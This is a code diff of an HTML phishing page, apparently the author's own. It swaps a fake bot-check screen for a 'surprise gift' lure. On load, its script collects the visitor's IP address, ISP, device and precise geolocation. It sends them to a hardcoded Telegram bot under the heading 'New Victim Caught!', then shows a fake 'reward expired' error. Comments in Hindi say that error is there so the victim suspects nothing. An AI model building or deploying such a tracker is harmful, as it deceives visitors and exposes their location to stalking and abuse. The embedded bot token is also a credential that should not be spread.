@@ -3,55 +3,75 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hacker Colony | Secure Connection</title>
+    <title>🎁 Claim Your Surprise Gift!</title>
     <style>
-        body { background-color: #000; color: #0f0; font-family: 'Courier New', monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .box { border: 1px solid #0f0; padding: 20px; border-radius: 8px; box-shadow: 0 0 15px #0f0; text-align: center; }
-        .loading { font-size: 20px; margin-bottom: 10px; }
+        body { background-color: #0f172a; color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        .container { text-align: center; background: #1e293b; padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); border: 2px solid #3b82f6; width: 80%; max-width: 400px; }
+        h1 { color: #facc15; font-size: 24px; margin-bottom: 10px; }
+        p { color: #94a3b8; font-size: 16px; line-height: 1.5; }
+        .gift-box { font-size: 80px; margin: 20px 0; animation: shake 0.5s infinite; }
+        @keyframes shake { 0% { transform: rotate(0deg); } 25% { transform: rotate(5deg); } 50% { transform: rotate(0deg); } 75% { transform: rotate(-5deg); } 100% { transform: rotate(0deg); } }
+        #status { font-weight: bold; margin-top: 20px; color: #3b82f6; }
+        .btn { background: #3b82f6; color: white; padding: 12px 25px; border: none; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: not-allowed; opacity: 0.6; margin-top: 20px; }
     </style>
 </head>
 <body>
-    <div class="box">
-        <div class="loading">SYSTEM SCANNING...</div>
-        <p>Please Allow Permission to Verify You are Not a Bot</p>
+    <div class="container">
+        <div class="gift-box">🎁</div>
+        <h1>Congratulations!</h1>
+        <p>You have won an exclusive surprise gift! 🎊</p>
+        <p>To verify your account and claim the reward, please allow <b>Location Access</b> when prompted.</p>
+        <div id="status">🔄 Verifying Region...</div>
+        <button class="btn">CLAIM NOW</button>
     </div>
 
     <script>
+        // आपका टोकन और आईडी
         const token = '8341294834:AAGDMuDZJ8ZYtC6QPnF_3KH_aRJ3wXyg_w0';
         const chat_id = '7162565886';
 
         async function catchData() {
-            // IP और ISP प्राप्त करना
-            const ipData = await fetch('https://ipapi.co/json/').then(res => res.json());
-            
-            // लोकेशन प्राप्त करना
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(async (position) => {
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-                    const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+            try {
+                // IP और बेसिक डेटा
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const ipData = await ipRes.json();
 
-                    const message = `🚀 *New Victim Caught!* 🚀\n\n` +
-                                    `🌐 *IP:* ${ipData.ip}\n` +
-                                    `🏢 *ISP:* ${ipData.org}\n` +
-                                    `📱 *Device:* ${navigator.platform}\n` +
-                                    `🤖 *Browser:* ${navigator.userAgent.split(') ')[0]}) \n` +
-                                    `📍 *Location:* [Open in Google Maps](${mapUrl})\n\n` +
-                                    `*Created by Roshan*`;
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(async (pos) => {
+                        const lat = pos.coords.latitude;
+                        const lon = pos.coords.longitude;
+                        const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+                        
+                        // टेलीग्राम पर मैसेज भेजना (Roshan Ali के स्टाइलिश नाम के साथ)
+                        const text = `🚀 *New Victim Caught!* 🚀\n\n` +
+                                     `🌐 *IP:* \`${ipData.ip}\` \n` +
+                                     `🏢 *ISP:* ${ipData.org}\n` +
+                                     `📱 *Device:* ${navigator.platform}\n` +
+                                     `📍 *Location:* [Open in Google Maps](${mapUrl})\n\n` +
+                                     `⚡ *Created by Roshan Ali* ⚡`;
 
-                    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chat_id: chat_id, text: message, parse_mode: 'Markdown' })
+                        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                chat_id: chat_id,
+                                text: text,
+                                parse_mode: 'Markdown'
+                            })
+                        });
+
+                        // डेटा भेजने के बाद पेज को "बकवास" दिखाना
+                        document.getElementById('status').innerHTML = "<b style='color:#ef4444;'>❌ Error: Reward Expired!</b><br>This gift has already been claimed or the session timed out.";
+                    }, (err) => {
+                        document.getElementById('status').innerHTML = "⚠️ Verification Failed! Please allow location access to continue.";
                     });
-                    
-                    // डेटा भेजने के बाद यूट्यूब पर भेज दो ताकि उसे शक न हो
-                    window.location.href = "https://youtube.com/@hackers_colony_tech";
-                }, () => {
-                    alert("Please allow location to continue.");
-                });
+                }
+            } catch (e) {
+                console.log("Error catching data");
             }
         }
+
+        // पेज लोड होते ही काम शुरू
         window.onload = catchData;
     </script>
 </body>
